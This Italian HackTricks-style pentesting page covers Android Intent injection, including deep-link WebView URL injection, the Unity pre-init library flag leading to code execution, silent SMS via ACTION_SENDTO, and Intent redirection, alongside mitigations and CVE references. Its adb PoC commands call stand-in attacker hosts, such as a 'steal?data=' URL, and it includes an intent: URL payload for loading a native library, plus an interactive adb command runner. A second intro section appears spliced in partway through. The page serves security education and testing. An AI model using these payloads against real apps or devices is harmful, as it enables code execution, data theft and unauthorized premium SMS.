# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection sfrutta componenti che accettano Intents controllati dall'attaccante o dati che vengono poi convertiti in Intents. Due pattern molto comuni durante Android app pentests sono:

- Inviare extras creati ad hoc a exported Activities/Services/BroadcastReceivers che vengono poi inoltrati a componenti privilegiati, non-exported.
- Attivare exported VIEW/BROWSABLE deep links che inoltrano URL controllati dall'attaccante in WebViews interne o altri sink sensibili.

## Deep links → WebView sink (URL parameter injection)

Se un'app espone un custom scheme deep link come:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
Se l'Activity ricevente inoltra il parametro di query `url` in una WebView, puoi forzare l'app a visualizzare contenuti remoti arbitrari nel proprio contesto WebView.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impatto
- HTML/JS viene eseguito all'interno del profilo WebView dell'app.
- Se JavaScript è abilitato (di default o a causa di controlli nell'ordine errato), è possibile enumerare/usare qualsiasi oggetto `@JavascriptInterface` esposto, rubare i cookie/local storage di WebView e pivotare.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Bug nell'ordine dei controlli che abilita JavaScript

Un bug ricorrente è l'abilitazione di JavaScript (o di altre impostazioni permissive di WebView) prima che la verifica/final URL allowlist sia completata. Se helper iniziali accettano il tuo deep link e la WebView viene configurata per prima, il caricamento finale avviene con JavaScript già abilitato anche se i controlli successivi sono difettosi o arrivano troppo tardi.

Cosa cercare nel codice decompilato:
- Più helper che parsano/dividono/ricostruiscono l'URL in modo diverso (normalizzazione incoerente).
- Chiamate a `getSettings().setJavaScriptEnabled(true)` prima dell'ultimo controllo allowlist su host/path.
- Una pipeline tipo: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → iniezione di libreria nativa pre-init (RCE)

Le app Android basate su Unity tipicamente usano `com.unity3d.player.UnityPlayerActivity` (o `UnityPlayerGameActivity`) come Activity di ingresso. Il template Android di Unity tratta un Intent extra speciale chiamato `unity` come una stringa di flag della command-line per il runtime Unity. Quando l'Activity di ingresso è exported (impostazione di default in molti template), qualsiasi app locale — e a volte un sito web se `BROWSABLE` è presente — può fornire questo extra.

Un flag pericoloso e non documentato porta all'esecuzione di codice nativo durante le primissime fasi di inizializzazione del processo:

- Flag nascosto: `-xrsdk-pre-init-library <absolute-path>`
- Effetto: `dlopen(<absolute-path>, RTLD_NOW)` molto presto nell'init, caricando un ELF controllato dall'attaccante all'interno del processo dell'app target con il suo UID e i suoi permessi.

Estratto di reverse-engineering (semplificato):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Why it works
- The Intent extra `unity` viene interpretato come flag di runtime di Unity.
- Fornire il flag pre-init indirizza Unity verso un percorso ELF controllato dall'attaccante all'interno di un percorso di namespace del linker consentito (vedi vincoli sotto).

Conditions for exploitation
- L'entry Activity di Unity è exported (comune per impostazione predefinita).
- Per one-click remote via browser: l'entry Activity dichiara anche `android.intent.category.BROWSABLE` così gli extras possono essere passati da un URL `intent:`.

Local exploitation (same device)
1) Posiziona un payload ELF in un percorso leggibile dall'app vittima. Il modo più semplice: distribuisci una libreria malevola nella tua app dell'attaccante e assicurati che venga estratta sotto `/data/app/.../lib/<abi>/` impostando nel manifest dell'attaccante:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Avvia l'attività Unity della vittima con il flag pre-init della CLI nell'extra `unity`. Esempio PoC ADB:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity chiama `dlopen("/data/.../libpayload.so", RTLD_NOW)`; il tuo payload viene eseguito nel processo della vittima, ereditando tutte le autorizzazioni dell'app (fotocamera/microfono/rete/archiviazione, ecc.) e l'accesso a sessioni/dati in-app.

Notes
- Il percorso esatto `/data/app/...` varia tra dispositivi/installazioni. Un'app dell'attaccante può recuperare la propria directory delle librerie native a runtime tramite `getApplicationInfo().nativeLibraryDir` e comunicarla al trigger.
- Il file non deve necessariamente terminare con `.so` se è un ELF valido – `dlopen()` si occupa degli header ELF, non delle estensioni.

Remote one‑click via browser (conditional)
Se l'activity di ingresso di Unity è esportata con `BROWSABLE`, un sito web può passare extras tramite un URL `intent:`:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Tuttavia, su Android moderno i dynamic linker namespaces e SELinux impediscono il caricamento da molti percorsi pubblici (ad es., `/sdcard/Download`). Vedrai errori come:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: prendere di mira le app che memorizzano byte controllati dall'attaccante nella loro area di storage privata (es., HTTP caches). Poiché i percorsi consentiti includono `/data` e la directory privata dell'app, puntare `-xrsdk-pre-init-library` a un percorso assoluto all'interno della cache dell'app può soddisfare i vincoli del linker e portare a code execution. Questo rispecchia pattern precedenti cache-to-ELF RCE osservati in altre Android apps.


## Confused‑Deputy: Silent SMS/MMS via ACTION_SENDTO (Wear OS Google Messages)

Alcune app di messaggistica predefinite eseguono in modo errato implicit messaging intents automaticamente, trasformandoli in un confused‑deputy primitive: qualsiasi app non privilegiata può innescare `Intent.ACTION_SENDTO` con `sms:`, `smsto:`, `mms:`, o `mmsto:` e causare un invio immediato senza un UI di conferma e senza il permesso `SEND_SMS`.

Key points
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: impostare il destinatario nella URI, il testo del messaggio nell'extra `"sms_body"`.
- Permissions: none (no `SEND_SMS`), si basa sull'handler SMS/MMS di default.
- Observed: Google Messages for Wear OS (patched May 2025). Altri handler dovrebbero essere valutati in modo analogo.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (nessun permesso speciale)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Attack surface expansion (Wear OS)
- Qualsiasi componente in grado di avviare Activities può scatenare lo stesso payload: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- Se il default handler invia automaticamente, l'abuso può essere a un solo tap o completamente silenzioso da contesti in background a seconda delle politiche OEM.

Pentest checklist
- Risolvi `ACTION_SENDTO` sul target per identificare il default handler; verifica se mostra un'interfaccia di composizione oppure invia silenziosamente.
- Testa tutti e quattro gli schemi (`sms:`, `smsto:`, `mms:`, `mmsto:`) e gli extras (`sms_body`, opzionalmente `subject` per MMS) per verificare differenze di comportamento.
- Considera destinazioni a pagamento/numeri a tariffa maggiorata quando testi su dispositivi reali.


## Altri primitivi classici di Intent injection

- startActivity/sendBroadcast usando extras dell'`Intent` forniti dall'attaccante che vengono poi ri-parsati (`Intent.parseUri(...)`) ed eseguiti.
- Componenti proxy esportati che inoltrano Intents a componenti sensibili non-esportati senza controlli di permesso.

---

## Automating exported-component testing (Smali-driven ADB generation)

Quando i componenti esportati si aspettano extras specifici, indovinare la forma del payload causa perdita di tempo e falsi negativi. Puoi automatizzare la scoperta di chiavi/tipi direttamente da Smali ed emettere comandi adb pronti all'esecuzione.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approccio: decompilare e scansionare Smali alla ricerca di chiamate come `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` per dedurre quali extras e campi sono consumati da ogni componente.
- Output: per ogni Activity/Service/Receiver/Provider esportato, lo strumento stampa una breve spiegazione e il comando esatto `adb shell am ...`/`cmd content ...` con flag correttamente tipizzati.

Installazione
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Uso
```bash
python apk-components-inspector.py target.apk
```
# Intent Injection

Intent Injection è una classe di vulnerabilità Android in cui un attacker invia un `Intent` malformato a un componente esportato (Activity, Service, BroadcastReceiver) per ottenere comportamenti non intenzionati dall'app vulnerable.

## Come funziona

Molte app espongono componenti senza validare gli Intent in ingresso. Se un componente è `exported` o registra un `intent-filter` implicito, un attacker locale o remoto (se l'app espone surface di rete) può inviare un Intent con action/data/extras controllati per manipolare lo stato dell'app, esfiltrare dati o eseguire operazioni con privilegi più alti.

Tipici vettori:
- Activity esportate che accettano `extras` senza sanitizzazione.
- BroadcastReceiver che processano Intent esterni.
- Service che eseguono operazioni basate su parametri dell'Intent.
- PendingIntent non protetti che vengono inviati da componenti con privilegi.

## Riconoscere componenti vulnerabili

Usare `aapt` o `adb` per enumerare componenti esportati:

```
aapt dump xmltree app.apk AndroidManifest.xml | grep exported
```

Oppure con `adb` e `pm`:

```
adb shell pm dump com.victim.app | grep -i recipient
```

Cerca Activity/Service/BroadcastReceiver con `exported="true"` o con `intent-filter` senza restrizioni.

## Esempio di attacco

Supponiamo che com.victim.app abbia un'Activity esportata che legge un extra chiamato `url` e apre una pagina:

```
adb shell am start -n com.victim.app/.OpenUrlActivity --es "url" "http://attacker.example/steal?data=..."
```

Un attacker può anche specificare action/data:

```
adb shell am start -a android.intent.action.VIEW -d "attacker://payload" com.victim.app
```

Per inviare bundle complessi:

```
adb shell am broadcast -a com.victim.app.EXPLOIT --es "token" "ABC123" --ei "uid" 1001
```

## Possibili impatti

- Esfiltrazione di dati sensibili letti dall'Intent o da risorse accessibili al componente.
- SSRF/URL injection se l'app effettua richieste verso URL controllati.
- Elevazione di privilegio logica se l'Intent causa operazioni che non dovrebbero essere accessibili esternamente.
- Abuse di PendingIntent per eseguire azioni con i permessi del process owner.

## Mitigazioni

Sviluppatori dovrebbero:
- Evitare di rendere componenti `exported` se non necessario (AndroidManifest.xml: `android:exported="false"`).
- Usare explicit Intent quando possibile (specificare il package/class).
- Validare e sanitizzare tutti gli extras ricevuti.
- Richiedere permessi per componenti sensibili (`android:permission`).
- Per PendingIntent, usare flag come `FLAG_IMMUTABLE`/`FLAG_UPDATE_CURRENT` appropriatamente e limitare il contenuto.

Esempio (AndroidManifest.xml):

```
<activity android:name=".OpenUrlActivity" android:exported="false" />
```

Oppure richiedere un permission:

```
<activity android:name=".SensitiveActivity" android:permission="com.victim.app.MY_PERMISSION" />
```

Controllare sempre l'origine dell'Intent prima di eseguire operazioni sensibili.

## Tool utili

- adb
- aapt
- jadx / apktool per analisi statica dell'APK
- dynamic instrumentation (Frida) per intercettare e ispezionare Intent a runtime
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras cheat sheet (flag sensibili al tipo)
- Stringhe: `--es key value` | Array di stringhe: `--esa key v1,v2`
- Interi: `--ei key 123` | Array di interi: `--eia key 1,2,3`
- Booleani: `--ez key true|false`
- Long (interi lunghi): `--el key 1234567890`
- Float: `--ef key 1.23`
- URI (extra): `--eu key content://...` | Data URI (dati Intent): `-d content://...`
- Extra componente: `--ecn key com.pkg/.Cls`
- Extra stringa nulla: `--esn key`
- Flag comuni: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- Usa `adb shell cmd content query|insert|update|delete ...` per raggiungere ContentProviders senza agenti.
- Per il probing SQLi, varia `--projection` e `--where` (aka selection) quando il provider sottostante è basato su SQLite.

Automazione full-pipeline (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Script di supporto per analizzare ed eseguire comandi adb</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Esegui sul dispositivo: l'inspector è basato su Python e funziona in Termux o su telefoni rooted dove sono disponibili `apktool`/`androguard`.

---

## Intent Redirection (CWE-926) – identificazione e sfruttamento

Schema
- Un punto di ingresso esportato (Activity/Service/Receiver) legge un Intent in arrivo e lo inoltra internamente o esternamente senza validare origine/dati, per esempio:
- `startActivity(getIntent())`
- `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
- Affidarsi ai campi `action`/`data`/`component` senza verifiche; mancata verifica dell'identità del chiamante.

Cosa cercare in Smali/Java
- Uso di `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Chiamate dirette a `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` su Intents influenzati dall'attaccante.
- Assenza di controlli `getCallingPackage()`/`getCallingActivity()` o di gate di permessi personalizzati.

Template PoC per ADB
- Proxy Activity che inoltra un Intent extra a un'Activity interna privilegiata:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Servizio esportato che supporta un parcelable `redirect_intent`:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver che inoltra senza convalida:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flag utili per il comportamento in stile singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Esempi reali (impatto variabile):
- CVE-2024-26131 (Element Android): flussi esportati che portano a manipolazione di WebView, bypass del PIN, login hijack.
- CVE-2023-44121 (LG ThinQ Service): azione di receiver esportato `com.lge.lms.things.notification.ACTION` → effetti a livello di sistema.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): reindirizzamento → accesso arbitrario a file (con interazione dell'utente).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## Riferimenti

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
